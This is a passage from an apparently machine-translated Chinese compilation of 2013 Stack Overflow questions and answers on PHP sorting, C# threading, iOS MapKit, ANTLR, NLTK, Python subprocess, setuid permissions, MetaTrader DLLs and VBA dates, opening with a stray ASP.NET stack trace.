[BadImageFormatException: Could not load file or assembly 'Microsoft.TeamFoundation.WorkItemTracking.Client.Cache' or one of its dependencies. An attempt was made to load a program with an incorrect format.]
   System.Reflection.RuntimeAssembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, RuntimeAssembly locationHint, StackCrawlMark& stackMark, IntPtr pPrivHostBinder, Boolean throwOnFileNotFound, Boolean forIntrospection, Boolean suppressSecurityChecks) +0
   System.Reflection.RuntimeAssembly.InternalLoadAssemblyName(AssemblyName assemblyRef, Evidence assemblySecurity, RuntimeAssembly reqAssembly, StackCrawlMark& stackMark, IntPtr pPrivHostBinder, Boolean throwOnFileNotFound, Boolean forIntrospection, Boolean suppressSecurityChecks) +210
   System.Reflection.RuntimeAssembly.InternalLoad(String assemblyString, Evidence assemblySecurity, StackCrawlMark& stackMark, IntPtr pPrivHostBinder, Boolean forIntrospection) +242
   System.Reflection.RuntimeAssembly.InternalLoad(String assemblyString, Evidence assemblySecurity, StackCrawlMark& stackMark, Boolean forIntrospection) +17
   System.Reflection.Assembly.Load(String assemblyString) +35
   System.Web.Configuration.CompilationSection.LoadAssemblyHelper(String assemblyName, Boolean starDirective) +122

[ConfigurationErrorsException: Could not load file or assembly 'Microsoft.TeamFoundation.WorkItemTracking.Client.Cache' or one of its dependencies. An attempt was made to load a program with an incorrect format.]
   System.Web.Configuration.CompilationSection.LoadAssemblyHelper(String assemblyName, Boolean starDirective) +12759734
   System.Web.Configuration.CompilationSection.LoadAllAssembliesFromAppDomainBinDirectory() +503
   System.Web.Configuration.AssemblyInfo.get_AssemblyInternal() +142
   System.Web.Compilation.BuildManager.GetReferencedAssemblies(CompilationSection compConfig) +334
   System.Web.Compilation.BuildManager.CallPreStartInitMethods(String preStartInitListPath) +203
   System.Web.Compilation.BuildManager.ExecutePreAppStart() +152
   System.Web.Hosting.HostingEnvironment.Initialize(ApplicationManager appManager, IApplicationHost appHost, IConfigMapPathFactory configMapPathFactory, HostingEnvironmentParameters hostingParameters, PolicyLevel policyLevel, Exception appDomainCreationException) +1151

[HttpException (0x80004005): Could not load file or assembly 'Microsoft.TeamFoundation.WorkItemTracking.Client.Cache' or one of its dependencies. An attempt was made to load a program with an incorrect format.]
   System.Web.HttpRuntime.FirstRequestInit(HttpContext context) +12880068
   System.Web.HttpRuntime.EnsureFirstRequestInit(HttpContext context) +159
   System.Web.HttpRuntime.ProcessRequestNotificationPrivate(IIS7WorkerRequest wr, HttpContext context) +12721257 
```**

# php - PHP，下拉列表中的排序选项

> ID：15111172
> 
> 赞同：0
> 
> 时间：2013-02-27T11:39:52.360
> 
> 标签：php, sorting

我的下拉菜单有这样的选项

```
something 4M/512k
something 10M/768k
something 4M/2M
something 10M/5M
something 10M/10M
something 20M/20M (FTTH)
something 60M/60M (FTTH)
something 100M/100M (FTTH) 
```

现在排序应该是这样的：不要看something word，排序的第一列应该是4M或10M...... /符号之前的值。之后排序应该继续第二列512k或 2M ......但这取决于第二列中的值是否包含 k char（这意味着 kylobytes）应该是第一个（M 意味着兆字节）。第三列应该是 FTTH。例如，如果该行包含 (FTTH) 单词，它应该放在最后......

这是它应该是什么样子的例子

```
something 4M/512k
something 4M/2M
something 10M/768k
something 10M/5M
something 10M/10M
something 20M/20M (FTTH)
something 60M/60M (FTTH)
something 100M/100M (FTTH) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:42:57.363

您可以使用[http://www.php.net/usort](http://www.php.net/usort)创建自己的排序方法来对包含下拉选项的数组进行排序。

这应该让你有一个好的开始：

```
<?php
$data[] = "something 4M/512k";
$data[] = "something 10M/768k";
$data[] = "something 4M/2M";
$data[] = "something 10M/5M";
$data[] = "something 10M/10M";
$data[] = "something 20M/20M (FTTH)";
$data[] = "something 60M/60M (FTTH)";
$data[] = "something 100M/100M (FTTH)";

function mysort($a, $b){
  list($something, $a_speed) = explode(" ", $a);
  list($something, $b_speed) = explode(" ", $b);

  list($a_speed_part_1, $a_speed_part_2) = explode("/", $a_speed);
  list($b_speed_part_1, $b_speed_part_2) = explode("/", $b_speed);

  //TODO: add M/k comparison or calculation

  if(intval($a_speed_part_1) > intval($b_speed_part_1)){
    return 1;
  } elseif (intval($a_speed_part_1) < intval($b_speed_part_1)) {
    return -1;
  } else {
    if(intval($a_speed_part_2) > intval($b_speed_part_2)){
      return 1;
    } elseif (intval($a_speed_part_2) < intval($b_speed_part_2)) {
      return -1;
    } else {
      return 0;
    }
    return 0;
  }
}

usort($data, "mysort");
echo "<pre>";
print_r($data);
echo "</pre>"; 
```

# c# - 使用 System.Threading.Semaphore 批量处理一个非常大的列表

> ID：15111178
> 
> 赞同：0
> 
> 时间：2013-02-27T11:40:11.797
> 
> 标签：c#, .net-2.0

我在 .NET 2.0 中编写了以下代码

```
foreach(Item i in millonItemsIterator) {
    ItemThreadManager m = new ItemThreadManager(i);
    System.Threading.Thread t = new System.Threading.Thread(m.Process);
    t.Start()
}
SendCompletionEmail();

public class ItemThreadManager {
    private static Semaphore s = new Semaphore(20, 20);
    private Item item = null;
    public ItemThreadManager(Item i) {
        item = i;
    } 

    public void Process() {
        s.WaitOne();
        // do something with item.
        s.Release();
    }
} 
```

我使用 Semaphore 方法的意图是我以 20 个为一组来处理millionItems 列表中的项目。

但我不希望在处理完所有百万个项目之前发送电子邮件。上面的代码在处理完成之前发送电子邮件。

我的理解是，上面的代码一次只能处理 20 个项目。如果所有 20 个线程都在使用中，则会阻塞....但我认为最后 20 个....它不会等待它们完成，而是直接发送电子邮件。那么对于最后 20 年，我如何实现加入？

我的理解正确吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:47:28.027

要通过调用 SendEmail 使流程按顺序运行，您可以只使用 a`lock`或使用`Tasks`并链接调用。这是有关操作方法的链接[http://msdn.microsoft.com/en-us/library/dd537612.aspx](http://msdn.microsoft.com/en-us/library/dd537612.aspx)

鉴于它是 .net 2.0 并且您没有并行任务的新信息。使用 a`BackgroundWorker`运行批处理，然后挂钩它的`RunWorkerCompleted`事件以了解工作何时完成并且可以发送电子邮件。此处的文档-> [http://msdn.microsoft.com/en-US/library/system.componentmodel.backgroundworker_events(v=vs.80).aspx](http://msdn.microsoft.com/en-US/library/system.componentmodel.backgroundworker_events(v=vs.80).aspx)

# iphone - 使用 JSON 数据填充地图

> ID：15111180
> 
> 赞同：0
> 
> 时间：2013-02-27T11:40:14.543
> 
> 标签：iphone, ios, objective-c, mapkit

我正在使用来自`JSON`Web 服务的数据填充 mapkit 地图。每行数据都有一组坐标并添加到地图中。每行还有一个 URL。我的代码的问题在于，每个地图的注释标注附件按钮都使用相同的 URL（始终是数组中的最后一行数据）。该链接是字典中的最后一个链接。在`NSLOG`第 4 行下方的输出中是用于每个标注的链接。当然，每个标注都应该有自己的 URL。`dealAnnotation.title = [currentDeal objectForKey:@"vendor"];` 正在为每个地图对象显示正确的供应商名称。它只是始终显示字典中最后一个 URL 的 URL。

这是日志：

```
2013-02-27 11:17:35.077 link populated from map is http://www.http://www.****link1
2013-02-27 11:17:35.078 link populated from map is http://www.http://www.****link5
2013-02-27 11:17:35.079 link populated from map is http://www.http://www.****link3
2013-02-27 11:17:35.079 link populated from map is http://www.http://www.****link4 
```

这是我的代码：

具有正确标注按钮方法的 MKAnnotation`pushToSafari`

```
 -(MKAnnotationView *) mapView:(MKMapView *)mapView viewForAnnotation:(id <MKAnnotation>) annotation{

    if ([annotation isMemberOfClass:[MKUserLocation class]]) return nil;

    MKPinAnnotationView *annView=[[MKPinAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:@"currentloc"];
   // annView.pinColor = MKPinAnnotationColorGreen;

    UIButton* rightButton = [UIButton buttonWithType:UIButtonTypeDetailDisclosure];
    [rightButton setTitle:annotation.title forState:UIControlStateNormal];
    [rightButton addTarget:self
                    action:@selector(pushToSafari)
          forControlEvents:UIControlEventTouchUpInside];
    annView.rightCalloutAccessoryView = rightButton;

   // annView.animatesDrop=TRUE;
    annView.canShowCallout = YES;
    annView.calloutOffset = CGPointMake(-5, 5);

    //add custom yd pin
    annView.image = [UIImage imageNamed:@"icon-pin-2.png"];

    return annView;
} 
```

用数据填充地图的代码。这是`link = [currentDeal objectForKey:@"link"];` 为每个标注按钮设置 JSON 中最后一个 url的行

```
#pragma mark - Populate Map
- (void)populateMap:(MKMapView*)map withDeals:(NSArray*) deals
{
    NSLog(@"DEALS" );
    for (NSDictionary *currentDeal in deals) {
        CLLocationCoordinate2D  ctrpoint;
        ctrpoint.latitude = [[[currentDeal objectForKey:@"coords"] objectForKey:@"lat"] doubleValue];
        ctrpoint.longitude =[[[currentDeal objectForKey:@"coords"] objectForKey:@"lng"] doubleValue];
        MKPointAnnotation  *dealAnnotation   = [[MKPointAnnotation  alloc] init];
        dealAnnotation.coordinate = ctrpoint;
        dealAnnotation.title = [currentDeal objectForKey:@"vendor"];
        link = [currentDeal objectForKey:@"link"];

        NSLog(@"link populated from map is %@",link);

        NSDictionary *currDict = @{
        @"EUR": @"€",
        @"GBP": @"₤",
        @"USD": @"$",
        @"BRL": @"R$"
        };

        NSString *currName = [currentDeal objectForKey:@"currency"];
        NSString *currency = [currDict objectForKey:currName];

            dealAnnotation.subtitle = [NSString stringWithFormat:@"%@%i",currency,[[currentDeal objectForKey:@"price"] integerValue ]];

        NSLog(@"current deal currency sym is %@",[currentDeal objectForKey:@"id"]);

        [map setDelegate:self];
        [map addAnnotation:dealAnnotation];
    }
} 
```

带有 JSON 代码的 viewDidAppear: 方法：

```
- (void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];
    NSLog(@"MAP VIEW APPEARED");

    CLLocation *location = [locationManager location];
    // Configure the new event with information from the location
    CLLocationCoordinate2D coordinate = [location coordinate];

    NSLog(@"%f %f",coordinate.latitude,coordinate.longitude );
    if ( (double ) coordinate.latitude == 0 &&  (double )  coordinate.longitude == 0 ){
        CustomAlertView *alert = [[CustomAlertView alloc]initWithTitle:@"No GPS Connection" message:@"GPS data is currently unavailable. Please ensure that Location Services are turned on in Settings." delegate:self cancelButtonTitle:@"Ok" otherButtonTitles: nil];
        [alert show];
        return;
    }

    CLLocationDegrees currentLongitude=coordinate.longitude;
    CLLocationDegrees currentLatitude=coordinate.latitude;

    CLLocationCoordinate2D center = CLLocationCoordinate2DMake(currentLatitude, currentLongitude);
    [mapView setCenterCoordinate:center];
    NSString *query = [NSString stringWithFormat:@"http://www.****.com/coords=45.4640,9.1916&country=%@&maxdistance=3000&api.ofilter=track:iphone",APP_ID,lang];
    NSString *locationJsonString = [NSString
                                    stringWithContentsOfURL:[NSURL URLWithString:query]                            encoding:NSStringEncodingConversionAllowLossy|NSUTF8StringEncoding
                                    error:nil];

    SBJSON *parser = [[SBJSON alloc] init];
    NSDictionary *results = [parser objectWithString:locationJsonString error:nil];
    NSString *currentCity = [[[results objectForKey:@"results"] objectAtIndex:0] objectForKey:@"key"];
    NSLog(@"Current city is : %@",currentCity);

    NSString *dealSearch = [NSString stringWithFormat:@"http://****coords=45.4640,9.1916&maxdistance=20&api.ofilter=track:iphone",APP_ID,currentCity];

    NSString *dealsInCurrentLocationJsonString = [NSString stringWithContentsOfURL:[NSURL URLWithString:dealSearch] encoding:NSStringEncodingConversionAllowLossy|NSUTF8StringEncoding error:nil];

    //    SBJSON *parser2 = [[SBJSON alloc] init];
    NSDictionary *dealResults = [parser objectWithString:dealsInCurrentLocationJsonString error: nil];

    NSArray *listOfDeals = [dealResults objectForKey:@"results"];

    [self populateMap:mapView withDeals:listOfDeals];

    NSLog(@"dLongitude : %f", currentLongitude);
    NSLog(@"dLatitude : %f", currentLatitude);
} 
```

以及右侧标注按钮触摸的方法：

```
 -(IBAction)pushToSafari {
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:link]];

    NSLog(@"link touched from offers around me is %@",link);
} 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:04:14.373

这一行：

```
link = [currentDeal objectForKey:@"link"]; 
```

看起来它将一些名为“link”的实例变量设置为 url。所以它并不特定于任何注释。只有一个名为 link 的变量，所以无论它设置的最后一个值是什么，都会在那里。

还有这一行：

```
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:link]]; 
```

不从任何特定注释或任何东西中检索“链接”，只检索该“全局”链接变量。所以任何注释都是一样的。

**编辑（添加一种使其工作的方法）：**

因此，一种方法是扩展 MKPointAnnotation 并向其添加链接属性。然后，您可以使用添加正确的链接

```
dealAnnotation.link = [currentDeal objectForKey:@"link"]; 
```

然后使用：

```
- (void)mapView:(MKMapView *)mapView annotationView:(MKAnnotationView *)view calloutAccessoryControlTapped:(UIControl *)control 
```

如果附件视图是 UIButton 或扩展 UIControl 的东西，则在单击附件视图时会调用它。然后，您将可以访问注释视图，并可以访问它的注释并获取该特定注释的链接。因此，删除 [rightButton addTarget:self...] 行以使其正常工作。

# antlr - 使用 ParseTreeWalker 中止树遍历

> ID：15111181
> 
> 赞同：2
> 
> 时间：2013-02-27T11:40:17.740
> 
> 标签：antlr, antlr4

我的任务是为[Triangle Abstract Machine](http://www.dcs.gla.ac.uk/~daw/books/PLPJ/)编写一个“Calc”编译器，它将 Calc 源文件转换为 TAM 程序集。

Calc 语言由变量声明（仅支持整数）组成，

```
var someID : integer; 
```

作业

```
someID = 1+5-8+someID; 
```

和打印功能。

```
print(someID-10) 
```

目前，我正在使用 ANTLR4s 树行走设施，通过使用侦听器将 Calc 转换为 TAM 程序集（及其工作）。现在我想中止树遍历，如果发生上下文错误（例如使用未定义的变量）。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T20:11:36.007

你可以扔一个[`CancellationException`](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/CancellationException.html). 当[`BailErrorStrategy`](http://www.antlr.org/api/Java/org/antlr/v4/runtime/BailErrorStrategy.html)语法错误发生时，ANTLR 4 中的 中止解析，方法是抛出 a [`ParseCancellationException`](http://www.antlr.org/api/Java/org/antlr/v4/runtime/misc/ParseCancellationException.html)，它派生自`CancellationException`.

# nlp - nltk.word_tokenize 和 nltk.pos_tag 支持哪些语言

> ID：15111183
> 
> 赞同：4
> 
> 时间：2013-02-27T11:40:20.560
> 
> 标签：nlp, nltk

我需要对多种语言的文本进行名称实体提取：西班牙语、葡萄牙语、希腊语、捷克语、中文。

是否有这两个功能的所有支持语言的列表？有没有一种方法可以使用其他语料库以便包含这些语言？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-28T13:35:34.813

默认情况下，这两个函数都只支持英文文本。它实际上不在文档中，但您可以通过查看源代码来查看它：

1.  该`pos_tag()`函数从这个文件加载一个标记器： `'taggers/maxent_treebank_pos_tagger/english.pickle'`. （[见这里](http://nltk.org/_modules/nltk/tag.html#pos_tag)）

2.  该`word_tokenize()`函数使用 Treebank 标记器，它使用正则表达式来标记文本，如（英语）Penn Treebank Corpus 中的那样。（[见这里](http://nltk.org/api/nltk.tokenize.html?highlight=treebankwordtokenizer#nltk.tokenize.treebank.TreebankWordTokenizer)）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2022-02-10T17:35:13.217

NLTK 分词器支持的语言列表如下：

*   “捷克”
*   “丹麦语”
*   “荷兰语”
*   '英语'
*   “爱沙尼亚语”
*   '芬兰'
*   '法语'
*   '德语'
*   '希腊语'
*   “意大利语”
*   '挪威'
*   '抛光'
*   '葡萄牙语'
*   '俄语'
*   '斯洛文尼亚',
*   '西班牙语'
*   '瑞典'
*   '土耳其'

它对应于存储在 C:\Users\XXX\AppData\Roaming\nltk_data\tokenizers\punkt 中的泡菜（在 Windows 中）。这是您在标记时使用“语言”键输入的内容，例如

```
nltk.word_tokenize(text, language='italian') 
```

# python - 如何在多进程中从 python 调用 shell 脚本？

> ID：15111185
> 
> 赞同：1
> 
> 时间：2013-02-27T11:40:32.390
> 
> 标签：python, shell, python-2.7, subprocess

我想在后面运行一个 shell 脚本，它执行一项特定的工作，同时我将等待用户的输入来结束这项工作。我怎样才能做到这一点？这是我的示例代码：

```
from subprocess import call

cmd = "internals/applog.sh "
call([cmd])

raw_input("Press Y when you are done: ") 
```

上面的代码首先执行 call 语句，只有在 app log.sh 结束后才会出现以下消息。

这有什么帮助吗？我怎样才能做到，当用户输入 y 时，调用语句被中止？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:48:01.507

```
pid = Popen(["internals/applog.sh",])

while True:
    answer = raw_input("Press Y when you are done: ")
    if answer == 'Y':
        pid.kill()
        break 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:46:07.467

`call()`等待命令完成，我想你想`Popen`改用：

```
from subprocess import Popen

Popen(["internals/applog.sh"]) 
```

# wordpress - WordPress URL 问题

> ID：15111194
> 
> 赞同：0
> 
> 时间：2013-02-27T11:40:54.120
> 
> 标签：wordpress, url

嗨，我有一个 wordpress 网站，但遇到了一些 url 问题。为什么 url 显示与此类似：

[http://mysite.com/wp/index.php/testimonials/#.US3t4irt0mQ](http://mysite.com/wp/index.php/testimonials/#.US3t4irt0mQ)

而不仅仅是： http: [//mysite.com/wp/index.php/testimonials/](http://mysite.com/wp/index.php/testimonials/)

每次我加载页面时，地址栏上都会显示一个添加/扩展的 URL 字符（“#.US3t4irt0mQ”）。是什么导致了这个错误？很高兴收到你们的来信。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:46:47.993

这看起来像一个永久链接问题。在设置>永久链接中选择通用设置“帖子名称”，然后单击“保存更改”

# linux - 程序可以采用用户的权限，还是完全受所有者限制？

> ID：15111195
> 
> 赞同：3
> 
> 时间：2013-02-27T11:40:55.053
> 
> 标签：linux, unix

例如，当一个程序由 root 用户在 *nix 环境中运行，但程序所有者是非 root 用户时，该程序可以执行具有 root 权限的操作吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:42:20.337

应用程序的权限取决于执行该程序的用户。

例如，如果它需要所有者的权限，则该`sudo`命令将没有任何效果。此外，`/bin`（或任何其他系统位置）中的大多数应用程序都归根用户所有（因此无法（轻松）修改它们），但仍以用户权限执行。

请注意，如果程序设置了[`setuid`or`setgid`](http://en.wikipedia.org/wiki/Setuid)位，则应用程序将分别以用户和/或组权限启动。这允许普通用户执行通常需要 root 权限的操作，而无需访问 root 帐户。

要设置`setuid`位使用：

```
chmod u+s /path/to/application 
```

位也是如此`setgid`，但使用`g+s`而不是`u+s`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:42:36.847

默认情况下，该进程**使用启动它的用户的 ID 和权限**运行，而不是使用程序所有者 ID。因此，如果`root`从普通用户拥有的程序启动进程，该进程将以 ID=0 运行。

正如`Johnsyweb`评论中提到的，如果程序碰巧`setuid`设置了位，它将作为所有者运行。这就是`setuid`意思：*设置用户 ID*。通常这样做是为了允许普通用户运行`ping`需要超级用户权限的程序。

但是请注意，例如 Linux 具有“ *Linux Capabilities* ”形式的高级机制，其中可以授予某些选择权限而不是完整的 setuid。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:47:41.490

启动程序的用户决定了该运行的权限。如果您希望程序以其他用户的权限运行，您可以使用`su`或`sudo`设置该`setuid`程序的位

```
chown user program
chmod u+s program 
```

`user`无论谁运行程序，这都会强制使用权限。

# ios - 终止 NSURLConnection ios

> ID：15111196
> 
> 赞同：0
> 
> 时间：2013-02-27T11:40:58.290
> 
> 标签：ios, objective-c

我正在`NSURL`为身份验证创建连接`UIWebView`。它工作正常，但由于某种原因我无法获得授权。如果我输入了错误的密码，它不会让我再次尝试使用正确的密码登录。终止 的最佳方法是`NSURLconnection`什么？

我试过这个：

```
- (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error {
  NSString *errorText = [[error userInfo] description];
  NSLog (@"----------------------------------------------");
  NSLog (@"STEP 4 - connection didFailWithError");
  NSLog (@"Error message: %@", errorText);
  connection = nil;
} 
```

但由于某种原因它不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:53:17.160

无需以您想要的方式终止 NSURLConnection 。

实现了以下 NSURLConnection 委托方法来更改凭据（登录/通过）：

```
- (void)connection:(NSURLConnection *)connection didReceiveAuthenticationChallenge:(NSURLAuthenticationChallenge *)challenge 
```

在此方法中，您需要更改以提供新凭据。像这样的东西：

```
- (void)connection:(NSURLConnection *)connection didReceiveAuthenticationChallenge:(NSURLAuthenticationChallenge *)challenge {
    NSLog(@"received authentication challenge");
    NSURLCredential *newCredential = [NSURLCredential credentialWithUser:@"USER"
                                                                password:@"PASSWORD"
                                                             persistence:NSURLCredentialPersistenceForSession];
    NSLog(@"credential created");
    [[challenge sender] useCredential:newCredential forAuthenticationChallenge:challenge];
    NSLog(@"responded to authentication challenge");    
} 
```

# html - 在 netbeans 上安装 Angular JS

> ID：15111197
> 
> 赞同：3
> 
> 时间：2013-02-27T11:40:59.473
> 
> 标签：html, angularjs, angularjs-directive, netbeans-7

我在我的 netbeans 7 上安装了 Angular JS 插件，它工作正常，但我无法获得 Angular JS 之类的下拉指令建议`ng-app, ng-model="name"`。事实上，HTML 页面显示警告`Attribute "ng-app" not allowed on element "html" at this point.`

我使用[http://plugins.netbeans.org/plugin/40296](http://plugins.netbeans.org/plugin/40296)安装插件，下面是我在 index.html 中所做的：

```
<html ng-app>
<head>
    <script src="js/angular-0.9.19.min.js"></script> 
    <script src="js/angular.js"></script> 
</head>
<body>
<h1>Hello {{1+2}} </h1> 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-07T15:10:57.850

对于 NetBeans 团队来说，事实是我们希望在未来改进对 AngularJS 的支持。在 NetBeans 7.3 中，您会收到有关 ng-app、ng-model 等属性的警告是正确的。您可以使用第一行的提示来消除此错误：“禁用此文件的 HTML 错误检查”。我们正在努力支持 AngularJS 和其他框架，请关注[https://blogs.oracle.com/netbeanswebclient/](https://blogs.oracle.com/netbeanswebclient/)上的 NetBeans Web 客户端博客，以获取有关下一版本中新功能的更新。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-05-20T20:52:05.697

您可以使用`data-`前缀：“作为 Angular 的属性，至少 ng-app 等可以替换为对 IDE 和 AngularJS 也有效的 data-ng-app” [https://netbeans.org/bugzilla/show_bug。 cgi?id=225462](https://netbeans.org/bugzilla/show_bug.cgi?id=225462)

# ruby-on-rails - Heroku 上的 Rake 任务：STDIN.gets.strip - “Enter”键的行为相当于按下了两次

> ID：15111204
> 
> 赞同：1
> 
> 时间：2013-02-27T11:41:19.113
> 
> 标签：ruby-on-rails, heroku, stdin, enter, rake-task

我做了一个交互式 rake 任务来完成管理工作。此任务通过输入`STDIN.gets.strip`并在本地按计划运行：我输入一些值，按下`Enter`，任务进一步运行，在 next 停止`STDIN.gets.strip`。

但是当我尝试通过`heroku`gem（在 Windows 7 中）在 Heroku 上运行它时：

```
heroku run rake admin --app my-application 
```

它将按键识别`Enter`为按下了两次——第一次是有值的，第二次是`Enter`没有值的。

如何防止这种行为？我可以在之后以某种方式清理输入缓冲区`STDIN.gets.strip`吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:37:26.113

我个人认为这是错误的做法。

最好简单地定义你的 rake 任务来获取命令行参数，然后你就不需要处理交互式输入的麻烦了

有关更多详细信息，请参阅此问题

[Rails Rake：如何使用 :environment 将参数传递给任务](https://stackoverflow.com/questions/1357639/rails-rake-how-to-pass-in-arguments-to-a-task-with-environment)

# vb.net - 使用 VB.Net 创建 MetaTrader4 DLL

> ID：15111206
> 
> 赞同：0
> 
> 时间：2013-02-27T11:41:27.297
> 
> 标签：vb.net, dll, metatrader4

我正在尝试使用 VB.Net 为 MetaTrader4 创建一个 DLL。大多数示例都是用 C++ 编写的，但我知道它可以在 VB.Net 中完成。我知道它比 C++ 有点棘手。

谁能指出我正确的方向？关于定义 MT4_EXPFUNC __declspec(dllexport)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-04T02:21:27.327

我终于弄清楚该怎么做。尽管这不是理想的解决方案，但它确实有效。我在这里为“后代”记录。

基本上，我正在使用一个名为 DLLExporter.Exe 的程序，它将托管的 .Net 类方法转换为直接的非托管函数。它位于： http: [//www.codeproject.com/Articles/37675/Simple-Method-of-DLL-Export-without-C-CLI](http://www.codeproject.com/Articles/37675/Simple-Method-of-DLL-Export-without-C-CLI)

我的 VB.Net 代码示例：

```
Imports System.Runtime.InteropServices
Public Class myFXTrader

    <DllExporter.DllExport()>
    Public Shared Function storeFXRatesIntoSQL(
                                              <MarshalAsAttribute(UnmanagedType.LPWStr)> pvsBroker As String _
                                              , <MarshalAsAttribute(UnmanagedType.LPWStr)> pvsSymbol As String _
                                              , <MarshalAsAttribute(UnmanagedType.LPWStr)> pvsTimeStamp As String _
                                              , pviAsk As Double _
                                              , pviBid As Double) As <MarshalAsAttribute(UnmanagedType.LPWStr)> String
        Dim vsErrorCode As String = ""
        '---------------------------------
        Try
            '... do some work here ...
        Catch ex As Exception
        End Try
        '---------------------------------

        Return vsErrorCode
    End Function
End Class 
```

编译完上面的代码后，我就运行`DLLExporter myFXTrader.dll`它，它会做的很神奇。生成的 .dll 文件可以复制到 MT4 的库文件夹中，并且可以`#import`使用。请参阅下面的示例`Expert Advisor`代码：

```
#import "FXTrader.Exports.dll"
   string storeFXRatesIntoSQL(string pvsBroker, string pvsSymbol, string pviTimeStamp, double pviAsk, double pviBid);
#import

int start()
{
   Comment( storeFXRatesIntoSQL( AccountCompany(), Symbol(), TimeLocal(), Ask, Bid) );
   int err;
   err = GetLastError();
   if(err>0) { Alert( err ); }
   return(0);
} 
```

希望这会帮助那些尝试同样事情的人。我必须做很多阅读/研究才能弄清楚这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-28T20:34:46.677

您不会从 metatrader 中找到任何官方示例。他们的支持总是没有那么有用。

您提到的api确实是c ++，意思是本机。您正在寻找在 vb.net 中写一些东西。.Net 是托管代码，无论您是在寻找 vb 还是 c# 甚至是 f#，您都需要一个转换层来将本机 api 和数据结构转换为托管代码。

查看 c++/cli。Cli 是一个允许您在同一个程序集中混合本机代码和托管代码的框架。

__declspec(dllexport) 是一条指令，它告诉链接器要从本机 dll 中导出哪些函数，以便 dll 的使用者可以看到这些函数，并且可以在代码中调用它们。当您导出这样的函数时，它仍然是本机函数。

我不确定您是否尝试实现管理器或服务器 api。在管理器的情况下，整个 api 都在一个类中，指向该类的指针由管理器 dll 导出的唯一函数提供。在服务器的情况下，您是将 dll 作为插件写入服务器的人，因此理论上，您可以导出插件的每个功能，但输入和输出类型仍然是本地的，在这种情况下，您将拥有在导出的函数上编写转换器或使用 pinvoke。这是pinvoke的解释[http://www.codeproject.com/Articles/4965/Using-Platform-Invoke](http://www.codeproject.com/Articles/4965/Using-Platform-Invoke)

无论如何，您仍然需要编写本机 C++ 代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-10-09T12:00:24.080

有一个开源项目，它让您几乎可以完全访问 mtmanapi：[MetaTrader4.Manager.Wrapper](https://github.com/Uriil/MetaTrader4.Manager.Wrapper)。

它是用 C++/CLI 编写的，所以从 VB.NET 使用它不会有问题

# linux - 当我上传到服务器时重命名文件

> ID：15111210
> 
> 赞同：1
> 
> 时间：2013-02-27T11:41:44.303
> 
> 标签：linux, file-upload, upload, ftp, file-rename

最近我遇到了一个问题，我要上传`PHP`到不同的服务器，但有时服务器会更改某些图像或文件的名称，显然这会中断，所以我必须仔细检查一切是否正常。

有没有办法避免这种情况，这种情况只发生在某些文件上，没有巡逻，有人知道为什么会发生这种情况？

示例 1：

`<a onClick="presstab2( )"><div id="aobutton4" style= "background-image: url(imgs/offline_activity/1/tabs/TEXTDesarrollo.png); height: 20px; width: 96px;"></div></a>`

原始图像名称是 TEXTDesarrollo.png 但是当我检查上传到服务器的文件时，名称已更改为 TextDesarrollo.png

示例 2：

`<div id="wint" style= "background-image: url(imgs/offline_activity/1/Fondo.jpg); height: 648px; width: 996px; border: 1px solid black;">`

原始图像名称是 Fondo.jpg

但是当我检查上传到服务器的文件时，名称已更改为 fondo.png

我使用 filezilla 进行上传，在任何避免这种情况的建议之前我从来没有遇到过这个问题？

# excel - vba：日期函数返回“00:00:00”

> ID：15111218
> 
> 赞同：2
> 
> 时间：2013-02-27T11:42:08.500
> 
> 标签：excel, vba

如果传递的值“DateValue”为空，我的以下代码返回“00:00:00”

vba：

```
Public Function forDate(ByVal DateValue As String) As Date
Dim DoDate As Date
If Not IsNull(DateValue) And DateValue <> "" Then
DoDate = CDate(FormatDateTime(DateValue, 1, 10))
forDate = DoDate
End If
End Function 
```

“DateValue”为空时如何处理？？？请提出一个答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:37:59.800

`Date`如果您使用而`vbNull`不是`Null`. 虽然它会返回`#12/31/1899#`而不是`null`它自己。您可以稍后将日期变量与该已知空值检查为您的伪空值。

`DateSerial(100, 1, 1)`或者您可以将其设置为返回的最短日期`#1/1/100#`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T20:55:59.887

这将处理 null 和/或空字符串：

```
Public Function forDate(ByVal DateValue)
If IsDate(DateValue) Then
    forDate = CDate(DateValue)
Else
    forDate = CVErr(xlErrValue)
End If
End Function 
```

请注意，我已删除变量的定义以允许正确传递 NULL。在电子表格中用作函数时，`#VALUE!`如果传递了无法表示为日期的字符串，则该函数将返回错误

示例结果：
![例如](../Images/040681796616e3440835060ddafa50c5.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:47:45.313

我认为解决方案可能是使用变体参数声明函数|

```
Public Function forDate(DateValue) 
```

